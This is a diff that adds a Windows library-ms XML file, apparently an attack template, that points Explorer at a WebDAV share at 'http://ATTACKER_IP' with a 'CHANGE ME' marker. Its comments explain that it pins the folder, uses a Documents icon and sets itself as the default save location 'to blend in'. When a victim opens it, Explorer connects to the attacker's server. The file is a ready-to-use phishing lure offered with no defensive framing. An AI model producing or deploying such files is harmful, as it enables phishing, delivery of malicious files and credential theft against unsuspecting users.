@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <!-- version can be any number we choose -->
+  <version>7</version>
+  <!-- pin directory in Windows Explorer -->
+  <isLibraryPinned>true</isLibraryPinned>
+  <!-- imageres.dll pics from all Windows icons -->
+  <!-- '-1003' is Pictures folder icon -->
+  <!-- '-1002' is Documents folder icon -->
+  <iconReference>imageres.dll,-1003</iconReference>
+  <!-- templateInfo determines appearance and columns visible in Explorer window -->
+  <templateInfo>
+    <!-- Documents GUID -->
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <!-- searchConnector... specifies the storage location(s) the library points to -->
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <!-- use default behavior when user saving at this location, to blend in -->
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <!-- not documented in Microsoft Documentation webpage; used for compatibility -->
+      <isSupported>false</isSupported>
+      <!-- the location, our WebDAV URL -->
+      <simpleLocation>
+        <url>http://ATTACKER_IP</url>  <!-- <===== CHANGE ME!!!!! -->
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
